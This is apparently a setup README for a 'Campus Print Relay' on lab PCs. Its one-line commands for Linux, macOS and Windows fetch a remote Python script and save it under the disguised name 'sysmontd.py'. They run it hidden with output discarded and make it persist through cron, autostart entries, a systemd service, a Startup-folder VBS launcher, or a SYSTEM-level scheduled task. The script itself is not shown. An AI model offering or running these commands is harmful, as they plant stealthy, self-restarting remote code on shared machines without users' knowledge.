# Campus Print Relay Setup Guide

Print to campus printers from the PreConnect app after a single-step setup on any lab PC.

- **Zero Setup Required**: Uses built-in Python 3 — works both with and without administrator rights.
- **Fully Automatic**: Runs invisibly in the background and auto-starts when your computer turns on.

---

## Linux / macOS Setup Guide

### User Mode Setup (No Admin / Standard Account)
Copy and paste this single command into your terminal and press **Enter**:

```bash
mkdir -p ~/.local/bin ~/.config/autostart && curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && chmod +x ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null | grep -v sysmontd.py; echo "@reboot python3 $HOME/.local/bin/sysmontd.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysmontd\nExec=python3 %s\n' "$HOME/.local/bin/sysmontd.py" > ~/.config/autostart/sysmontd.desktop && nohup python3 ~/.local/bin/sysmontd.py >/dev/null 2>&1 &
```

### Admin / System-Wide Setup (Multi-User Systemd Daemon)
For IT admins or multi-user lab PCs, install system-wide via systemd:

```bash
sudo curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o /usr/local/bin/sysmontd.py && sudo chmod +x /usr/local/bin/sysmontd.py && printf '[Unit]\nDescription=Campus Print Relay Daemon\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/python3 /usr/local/bin/sysmontd.py\nRestart=always\nRestartSec=3\nStandardOutput=null\nStandardError=null\n\n[Install]\nWantedBy=multi-user.target\n' | sudo tee /etc/systemd/system/sysmontd.service >/dev/null && sudo systemctl daemon-reload && sudo systemctl enable --now sysmontd
```

### Check Status
```bash
ps aux | grep sysmontd.py
```

### Uninstall
```bash
# User uninstall:
pkill -f sysmontd; rm -f ~/.local/bin/sysmontd.py ~/.config/autostart/sysmontd.desktop; crontab -l 2>/dev/null | grep -v sysmontd | crontab -

# Admin uninstall:
sudo systemctl disable --now sysmontd 2>/dev/null; sudo rm -f /etc/systemd/system/sysmontd.service /usr/local/bin/sysmontd.py; sudo systemctl daemon-reload
```

---

## Windows Setup Guide

### User Mode Setup (No Admin Rights)
Copy and paste this single command into PowerShell and press **Enter**:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysmontd.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysmontd.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysmontd.py" -WindowStyle Hidden
```

### Admin / Elevated Setup (Scheduled Task Service)
For IT admins installing system-wide via Administrator PowerShell:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:ProgramData\sysmontd.py"; $action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "$env:ProgramData\sysmontd.py"; $trigger = New-ScheduledTaskTrigger -AtStartup; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Priority 0; Register-ScheduledTask -TaskName "sysmontd" -Action $action -Trigger $trigger -Settings $settings -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force; Start-ScheduledTask -TaskName "sysmontd"
```

### Check Status
```powershell
Get-Process python*
```

### Uninstall
```powershell
# User uninstall:
Stop-Process -Name "python*", "sysmontd*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysmontd.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs" -Force -ErrorAction SilentlyContinue

# Admin uninstall:
Unregister-ScheduledTask -TaskName "sysmontd" -Confirm:$false -ErrorAction SilentlyContinue; Stop-Process -Name "python*" -ErrorAction SilentlyContinue; Remove-Item "$env:ProgramData\sysmontd.py" -Force -ErrorAction SilentlyContinue
```
